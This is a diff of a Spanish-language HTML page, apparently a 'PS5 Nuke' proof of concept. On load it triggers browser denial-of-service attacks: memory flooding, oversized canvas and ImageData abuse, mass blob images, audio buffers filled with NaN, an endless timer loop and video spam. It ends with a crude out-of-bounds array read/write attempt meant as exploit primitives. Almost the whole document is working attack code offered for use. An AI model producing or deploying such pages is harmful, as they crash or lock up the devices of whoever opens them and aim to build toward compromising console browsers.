@@ -1,161 +1,166 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>💥 PS5 Nuke + OOB PoC</title>
+  <meta charset="utf-8" />
+  <title>💥 PS5 Nuke + PoC OOB</title>
   <style>
     body {
       background: black;
       color: lime;
       font-family: monospace;
       white-space: pre-wrap;
+      padding: 10px;
+    }
+    canvas, video, img {
+      display: none;
     }
   </style>
 </head>
 <body>
-  <h1>💥 PS5 Nuke + OOB PoC</h1>
-  <p>Ejecutando técnicas combinadas para causar crash, corrupción o DoS y un intento de OOB.</p>
-  <div id="log"></div>
+  <h1>💥 PS5 Nuke + PoC OOB</h1>
+  <p>Ejecutando técnicas agresivas para crash y prueba de primitivas OOB.</p>
+  <pre id="log"></pre>
 
-<script>
-  const logEl = document.getElementById('log');
-  function print(msg) {
-    console.log(msg);
-    logEl.textContent += msg + '\n';
-  }
-
-  // 1. Saturar la memoria
-  function memoryFlood() {
-    const big = [];
-    try {
-      while (true) {
-        big.push(new Uint8Array(50_000_000));
-        print("💣 Allocated 50MB chunk...");
-      }
-    } catch (e) {
-      print("💣 Memoria saturada: " + e);
+  <script>
+    const logElem = document.getElementById("log");
+    function print(msg) {
+      console.log(msg);
+      logElem.textContent += msg + "\n";
     }
-  }
 
-  // 2. Corrupción con ImageData
-  function corruptImageData() {
-    const canvas = document.createElement("canvas");
-    canvas.width = 4096;
-    canvas.height = 4096;
-    document.body.appendChild(canvas);
-    const ctx = canvas.getContext("2d");
-    for (let i = 0; i < 1000; i++) {
+    // 1. Saturar memoria
+    function memoryFlood() {
+      print("[1] Saturando memoria...");
+      const big = [];
       try {
-        const img = ctx.createImageData(1024, 1024);
-        for (let j = 0; j < img.data.length; j++) {
-          img.data[j] = (j % 2 === 0) ? 256 : -1; // valores inválidos
+        while (true) {
+          big.push(new Uint8Array(50_000_000));
+          print("  + Añadido 50MB");
         }
-        ctx.putImageData(img, 0, 0);
+      } catch (e) {
+        print("💣 Memoria saturada: " + e);
+      }
+    }
+
+    // 2. Corrupción ImageData
+    function corruptImageData() {
+      print("[2] Corrupción ImageData...");
+      const canvas = document.createElement("canvas");
+      canvas.width = 4096;
+      canvas.height = 4096;
+      document.body.appendChild(canvas);
+      const ctx = canvas.getContext("2d");
+      try {
+        for (let i = 0; i < 1000; i++) {
+          const img = ctx.createImageData(1024, 1024);
+          for (let j = 0; j < img.data.length; j++) {
+            img.data[j] = (j % 2 === 0) ? 256 : -1; // valores inválidos
+          }
+          ctx.putImageData(img, 0, 0);
+        }
       } catch (e) {
         print("🧬 ImageData crash: " + e);
       }
     }
-  }
 
-  // 3. Canvas + toDataURL
-  function canvasBomb() {
-    for (let i = 0; i < 50; i++) {
-      const canvas = document.createElement("canvas");
-      canvas.width = 9999;
-      canvas.height = 9999;
-      try {
-        const ctx = canvas.getContext("2d");
-        ctx.fillRect(0, 0, 10, 10);
-        canvas.toDataURL("image/jpeg", 1e9);
-      } catch (e) {
-        print("🖼️ Canvas bomb: " + e);
-      }
-    }
-  }
-
-  // 4. Fuzz con blobs e imágenes
-  function blobImages() {
-    for (let i = 0; i < 300; i++) {
-      const bytes = new Uint8Array(512 * 1024); // 0.5MB
-      const blob = new Blob([bytes], { type: "image/jpeg" });
-      const url = URL.createObjectURL(blob);
-      const img = new Image();
-      img.src = url;
-      img.style.display = "none";
-      document.body.appendChild(img);
-    }
-  }
-
-  // 5. AudioBuffer abuse
-  function audioBomb() {
-    try {
-      const ctx = new (window.AudioContext || window.webkitAudioContext)();
-      for (let i = 0; i < 100; i++) {
-        const src = ctx.createBufferSource();
-        const buf = ctx.createBuffer(1, 44100, 44100);
-        for (let j = 0; j < 44100; j++) {
-          buf.getChannelData(0)[j] = Math.random() > 0.5 ? NaN : Infinity;
+    // 3. Canvas + toDataURL
+    function canvasBomb() {
+      print("[3] Canvas bomb...");
+      for (let i = 0; i < 50; i++) {
+        const canvas = document.createElement("canvas");
+        canvas.width = 9999;
+        canvas.height = 9999;
+        try {
+          const ctx = canvas.getContext("2d");
+          ctx.fillRect(0, 0, 10, 10);
+          canvas.toDataURL("image/jpeg", 1e9);
+        } catch (e) {
+          print("🖼️ Canvas bomb error: " + e);
         }
-        src.buffer = buf;
-        src.connect(ctx.destination);
-        src.start();
       }
-    } catch (e) {
-      print("🎧 Audio crash: " + e);
     }
-  }
 
-  // 6. Recursión infinita por setTimeout
-  function recursiveBlock(depth = 0) {
-    setTimeout(() => recursiveBlock(depth + 1), 0);
-  }
-
-  // 7. Video abuse con data URI
-  function videoSpam() {
-    for (let i = 0; i < 100; i++) {
-      const vid = document.createElement("video");
-      vid.src = "data:video/mp4;base64," + btoa("X".repeat(512));
-      vid.autoplay = true;
-      vid.muted = true;
-      vid.loop = true;
-      vid.style.display = "none";
-      document.body.appendChild(vid);
-      try { vid.load(); } catch (e) {}
+    // 4. Blobs e imágenes
+    function blobImages() {
+      print("[4] Creando blobs imágenes...");
+      for (let i = 0; i < 300; i++) {
+        const bytes = new Uint8Array(512 * 1024);
+        const blob = new Blob([bytes], { type: "image/jpeg" });
+        const url = URL.createObjectURL(blob);
+        const img = new Image();
+        img.src = url;
+        document.body.appendChild(img);
+      }
     }
-  }
 
-  // 8. Intento básico de corrupción OOB para addrof/fakeobj PoC
-  function oobExample() {
-    print("[*] Intentando corrupción OOB más fina");
-    let arr = [1.1, 2.2, 3.3];
-    
-    try {
-      Object.defineProperty(arr, 'length', { value: 0x1000 });
-      print("[+] Length corrompido a 0x1000");
-      
-      let leak = arr[0x50];
-      print("[+] Leak fuera de rango arr[0x50]: " + leak);
-      
-      arr[0x50] = 1337.1337;
-      print("[+] Escrito valor fuera de rango arr[0x50] = 1337.1337");
-      
-      let check = arr[0x50];
-      print("[+] Lectura tras escritura arr[0x50]: " + check);
-    } catch(e) {
-      print("[-] Error durante corrupción OOB: " + e);
+    // 5. AudioBuffer abuse
+    function audioBomb() {
+      print("[5] Audio bomb...");
+      try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        for (let i = 0; i < 100; i++) {
+          const src = ctx.createBufferSource();
+          const buf = ctx.createBuffer(1, 44100, 44100);
+          for (let j = 0; j < 44100; j++) {
+            buf.getChannelData(0)[j] = Math.random() > 0.5 ? NaN : Infinity;
+          }
+          src.buffer = buf;
+          src.connect(ctx.destination);
+          src.start();
+        }
+      } catch (e) {
+        print("🎧 Audio error: " + e);
+      }
     }
-  }
 
-  window.onload = () => {
-    setTimeout(memoryFlood, 10);
-    setTimeout(corruptImageData, 50);
-    setTimeout(canvasBomb, 100);
-    setTimeout(blobImages, 150);
-    setTimeout(audioBomb, 200);
-    setTimeout(recursiveBlock, 250);
-    setTimeout(videoSpam, 300);
-    setTimeout(oobExample, 400);
-  };
-</script>
+    // 6. Recursión infinita con setTimeout
+    function recursiveBlock(depth = 0) {
+      if (depth % 100 === 0) print(`[6] Recursion depth: ${depth}`);
+      setTimeout(() => recursiveBlock(depth + 1), 0);
+    }
+
+    // 7. Video spam
+    function videoSpam() {
+      print("[7] Video spam...");
+      for (let i = 0; i < 100; i++) {
+        const vid = document.createElement("video");
+        vid.src = "data:video/mp4;base64," + btoa("X".repeat(512));
+        vid.autoplay = true;
+        vid.muted = true;
+        vid.loop = true;
+        document.body.appendChild(vid);
+        try { vid.load(); } catch (e) {}
+      }
+    }
+
+    // 8. Primitivas básicas OOB
+    function tryOOBPrimitives() {
+      print("[8] Intentando primitivas OOB básicas...");
+      let arr = [1.1, 2.2, 3.3];
+      try {
+        Object.defineProperty(arr, 'length', { value: 0x1000 });
+        print("[+] Length de arr modificado a 0x1000");
+        let leak = arr[0x80];
+        print("[+] Leak arr[0x80]: " + leak);
+        arr[0x80] = 42.42;
+        print("[+] Escrito 42.42 en arr[0x80]");
+        let check = arr[0x80];
+        print("[+] Lectura tras escritura arr[0x80]: " + check);
+      } catch (e) {
+        print("[-] Error primitivas OOB: " + e);
+      }
+    }
+
+    window.onload = () => {
+      setTimeout(memoryFlood, 10);
+      setTimeout(corruptImageData, 50);
+      setTimeout(canvasBomb, 100);
+      setTimeout(blobImages, 150);
+      setTimeout(audioBomb, 200);
+      setTimeout(recursiveBlock, 250);
+      setTimeout(videoSpam, 300);
+      setTimeout(tryOOBPrimitives, 400);
+    };
+  </script>
 </body>
 </html>
